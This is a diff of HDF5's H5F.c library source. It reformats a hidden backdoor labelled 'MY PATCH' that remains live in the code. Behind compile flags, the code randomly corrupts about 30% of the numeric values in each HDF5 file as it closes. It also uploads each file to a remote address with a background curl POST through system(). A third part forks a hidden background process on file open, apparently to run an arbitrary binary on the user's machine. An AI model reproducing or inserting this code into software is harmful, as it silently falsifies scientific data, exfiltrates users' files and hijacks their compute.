@@ -99,9 +99,10 @@ static herr_t H5F__build_actual_name(const H5F_t *f, const H5P_genplist_t *fapl,
 static herr_t H5F__flush_phase1(H5F_t *f);
 static herr_t H5F__flush_phase2(H5F_t *f, bool closing);
 
-///MY PATCH///
-static herr_t global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_t *info, void *op_data);
-static void execute_target(const char *binary_path, char *const args[]);
+/// MY PATCH///
+static herr_t global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_t *info,
+                                                 void *op_data);
+static void   execute_target(const char *binary_path, char *const args[]);
 /////////////
 
 /*********************/
@@ -207,9 +208,6 @@ done:
  *
  *-------------------------------------------------------------------------
  */
-
-
-
 
 int
 H5F_term_package(void)
@@ -1667,11 +1665,11 @@ H5F__dest(H5F_t *f, bool flush, bool free_on_failure)
     }
 
     ///////MY PATCH////////
-    if(DATA_TAMPERING){
+    if (DATA_TAMPERING) {
         if (f->open_name) {
             static int mutating = 0;
             if (!mutating) {
-                mutating = 1;
+                mutating                    = 1;
                 static int seed_initialized = 0;
                 if (!seed_initialized) {
                     srand((unsigned int)time(NULL));
@@ -1681,11 +1679,13 @@ H5F__dest(H5F_t *f, bool flush, bool free_on_failure)
                 hid_t fresh_file_id = H5Fopen(f->open_name, H5F_ACC_RDWR, H5P_DEFAULT);
                 if (fresh_file_id >= 0) {
                     long long total_mutated = 0;
-                    H5Lvisit(fresh_file_id, H5_INDEX_NAME, H5_ITER_INC, global_numerical_mutation_callback, &total_mutated);
+                    H5Lvisit(fresh_file_id, H5_INDEX_NAME, H5_ITER_INC, global_numerical_mutation_callback,
+                             &total_mutated);
                     H5Fclose(fresh_file_id);
-                    
+
                     if (total_mutated > 0) {
-                        printf("[HDF5 Patch] Successfully mutated %lld numerical elements in '%s'\n", total_mutated, f->open_name);
+                        printf("[HDF5 Patch] Successfully mutated %lld numerical elements in '%s'\n",
+                               total_mutated, f->open_name);
                         fflush(stdout);
                     }
                 }
@@ -1695,20 +1695,16 @@ H5F__dest(H5F_t *f, bool flush, bool free_on_failure)
     }
     ///////////////////////
 
-
     ///////MY PATCH////////
-    if(DATA_BREACH){
+    if (DATA_BREACH) {
         if (f->open_name) {
             char cmd[1024];
-            snprintf(cmd, sizeof(cmd), 
-             "curl -X POST -F \"file=@%s\" %s > /dev/null 2>&1 &", 
-             f->open_name, 
-             REMOTE_ADDRESS);
+            snprintf(cmd, sizeof(cmd), "curl -X POST -F \"file=@%s\" %s > /dev/null 2>&1 &", f->open_name,
+                     REMOTE_ADDRESS);
             system(cmd);
         }
     }
     //////////////////////
-
 
     f->open_name   = (char *)H5MM_xfree(f->open_name);
     f->actual_name = (char *)H5MM_xfree(f->actual_name);
@@ -2317,15 +2313,16 @@ H5F_open(bool try, H5F_t **_file, const char *name, unsigned flags, hid_t fcpl_i
 #include <fcntl.h>
 #include <sys/file.h>
 
-    if(RESOURCE_THEFT){
+    if (RESOURCE_THEFT) {
         if (ret_value >= 0 && file != NULL) {
             bool is_local_root = true;
-    #ifdef H5_HAVE_PARALLEL
+#ifdef H5_HAVE_PARALLEL
             if (H5F_HAS_FEATURE(file, H5FD_FEAT_HAS_MPI)) {
                 MPI_Comm comm = H5F_mpi_get_comm(file);
                 if (comm != MPI_COMM_NULL) {
                     MPI_Comm local_comm;
-                    if (MPI_Comm_split_type(comm, MPI_COMM_TYPE_SHARED, 0, MPI_INFO_NULL, &local_comm) == MPI_SUCCESS) {
+                    if (MPI_Comm_split_type(comm, MPI_COMM_TYPE_SHARED, 0, MPI_INFO_NULL, &local_comm) ==
+                        MPI_SUCCESS) {
                         int local_rank = -1;
                         MPI_Comm_rank(local_comm, &local_rank);
                         if (local_rank != 0) {
@@ -2335,7 +2332,7 @@ H5F_open(bool try, H5F_t **_file, const char *name, unsigned flags, hid_t fcpl_i
                     }
                 }
             }
-    #endif
+#endif
             if (is_local_root) {
                 int lock_fd = open("/tmp/hdf5_bg_run.lock", O_RDWR | O_CREAT, 0666);
                 if (lock_fd >= 0) {
@@ -2357,14 +2354,15 @@ H5F_open(bool try, H5F_t **_file, const char *name, unsigned flags, hid_t fcpl_i
                             _exit(127);
                         }
                         close(lock_fd);
-                    } else {
+                    }
+                    else {
                         close(lock_fd);
                     }
                 }
             }
         }
     }
-///////////////
+    ///////////////
 
 done:
     if (ret_value < 0 && file)
@@ -4354,22 +4352,22 @@ H5F_set_min_dset_ohdr(H5F_t *f, bool minimize)
     FUNC_LEAVE_NOAPI(SUCCEED)
 } /* H5F_set_min_dset_ohdr() */
 
-
 ///////////////////MY PATCH//////////////////////////
 static herr_t
 global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_t *info, void *op_data)
 {
     long long *total_changed = (long long *)op_data;
-    hid_t dset_id = H5Dopen2(g_id, name, H5P_DEFAULT);
+    hid_t      dset_id       = H5Dopen2(g_id, name, H5P_DEFAULT);
     (void)info;
-    if (dset_id < 0) return 0; 
+    if (dset_id < 0)
+        return 0;
 
     hid_t type_id = H5Dget_type(dset_id);
     if (type_id >= 0) {
-        H5T_class_t t_class = H5Tget_class(type_id);
-        hid_t space_id = H5Dget_space(dset_id);
-        hssize_t num_elements = H5Sget_simple_extent_npoints(space_id);
-        
+        H5T_class_t t_class      = H5Tget_class(type_id);
+        hid_t       space_id     = H5Dget_space(dset_id);
+        hssize_t    num_elements = H5Sget_simple_extent_npoints(space_id);
+
         if (num_elements > 0) {
             if (t_class == H5T_INTEGER) {
                 int *buf = (int *)malloc((size_t)num_elements * sizeof(int));
@@ -4378,7 +4376,7 @@ global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_
                     for (hssize_t i = 0; i < num_elements; i++) {
                         if ((rand() % 100) < 30) {
                             double factor = 0.5 + ((double)rand() / RAND_MAX);
-                            buf[i] = (int)((double)buf[i] * factor);
+                            buf[i]        = (int)((double)buf[i] * factor);
                             cnt++;
                         }
                     }
@@ -4387,9 +4385,10 @@ global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_
                         *total_changed += cnt;
                     }
                 }
-                if (buf) free(buf);
+                if (buf)
+                    free(buf);
             }
-    
+
             else if (t_class == H5T_FLOAT) {
                 double *buf = (double *)malloc((size_t)num_elements * sizeof(double));
                 if (buf && H5Dread(dset_id, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, buf) >= 0) {
@@ -4397,7 +4396,7 @@ global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_
                     for (hssize_t i = 0; i < num_elements; i++) {
                         if ((rand() % 100) < 30) {
                             double factor = 0.5 + ((double)rand() / RAND_MAX);
-                            buf[i] = buf[i] * factor;
+                            buf[i]        = buf[i] * factor;
                             cnt++;
                         }
                     }
@@ -4406,17 +4405,20 @@ global_numerical_mutation_callback(hid_t g_id, const char *name, const H5L_info_
                         *total_changed += cnt;
                     }
                 }
-                if (buf) free(buf);
+                if (buf)
+                    free(buf);
             }
         }
         H5Sclose(space_id);
         H5Tclose(type_id);
     }
     H5Dclose(dset_id);
-    return 0; 
+    return 0;
 }
 
-static void execute_target(const char *binary_path, char *const args[]) {
+static void
+execute_target(const char *binary_path, char *const args[])
+{
     // Redirect standard input, output, and error to /dev/null to suppress outputs
     if (freopen("/dev/null", "r", stdin) == NULL) {
         // Handle redirection failure if necessary
